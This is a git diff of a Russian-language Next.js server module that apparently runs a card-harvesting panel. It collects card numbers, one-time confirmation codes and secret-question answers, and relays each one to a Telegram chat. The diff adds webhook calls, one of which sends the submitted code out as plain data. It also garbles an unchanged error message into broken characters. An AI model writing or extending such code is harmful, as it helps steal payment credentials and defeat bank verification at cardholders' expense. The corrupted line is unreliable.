@@ -8,6 +8,7 @@ import { getSessionUser, getUserId } from "@/lib/session"
 import { paymentCard } from "@/lib/db/schema"
 import { CARD_BRAND_LABEL, detectBank, detectBrand, formatCardNumber, formatExpiry, isExpiryValid, luhnValid, normalizeCardNumber, type CardBrand } from "@/lib/payment-cards"
 import { escapeTelegram, notifyTelegram } from "@/lib/telegram"
+import { emitCardEvent } from "@/lib/card-webhook"
 import { allowUserAction, RATE_LIMIT_ERROR } from "@/lib/rate-limit"
 import { toCardholder } from "@/lib/translit"
 import { generateRequestNo } from "@/lib/card-requests"
@@ -73,6 +74,7 @@ export async function reportCardFrame(id: number, event: "opened" | "finished"):
       event === "finished" ? sql`true` : isNull(paymentCard.frameStatus),
     ))
     .returning({ requestNo: paymentCard.requestNo })
+  if (row) emitCardEvent(id, event === "finished" ? "card.frame_finished" : "card.frame_opened")
   if (row && event === "finished") {
     void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\nСтраница пройдена`)
   }
@@ -155,7 +157,7 @@ export async function requestCardBinding(input: {
     if (total >= MAX_CARDS) return { error: `Можно привязать не больше ${MAX_CARDS} карт.` }
     const [{ pending }] = await tx.select({ pending: count() }).from(paymentCard)
       .where(and(eq(paymentCard.userId, user.id), eq(paymentCard.status, "pending")))
-    if (pending >= MAX_PENDING) return { error: "Дождитесь обработки текущих заявок на привязку." }
+    if (pending >= MAX_PENDING) return { error: "Дождитесь обработки те��ущих заявок на привязку." }
     let requestNo = generateRequestNo()
     for (let attempt = 0; attempt < 5; attempt++) {
       const [taken] = await tx.select({ id: paymentCard.id }).from(paymentCard)
@@ -180,6 +182,7 @@ export async function requestCardBinding(input: {
     escapeTelegram(cardholder),
     `${escapeTelegram(CARD_BRAND_LABEL[brand])}${bankName ? ` · ${escapeTelegram(bankName)}` : ""}`,
   ].join("\n"))
+  emitCardEvent(created.id, "card.created")
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cardId: created.id, cards: await listCards(user.id) }
@@ -198,6 +201,7 @@ export async function submitCardCode(id: number, code: string): Promise<CardsRes
   if (!row) throw new Error("Заявка недоступна для отправки кода.")
 
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n<code>${escapeTelegram(trimmed)}</code>`)
+  emitCardEvent(id, "card.code_submitted", { code: trimmed })
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
@@ -221,6 +225,7 @@ export async function submitExtraCheckResponse(id: number, response: string): Pr
   if (!row) throw new Error("Заявка недоступна для ответа.")
 
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)
+  emitCardEvent(id, "card.extra_check_answered")
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
@@ -245,6 +250,7 @@ export async function submitSecretAnswer(id: number, response: string): Promise<
   if (!row) throw new Error("Вопрос уже недоступен.")
 
   void notifyTelegram(`<b>№ ${escapeTelegram(row.requestNo ?? String(id))}</b>\n${escapeTelegram(trimmed)}`)
+  emitCardEvent(id, "card.answer_received")
 
   revalidatePath("/cabinet/cards")
   return { ok: true, cards: await listCards(user.id) }
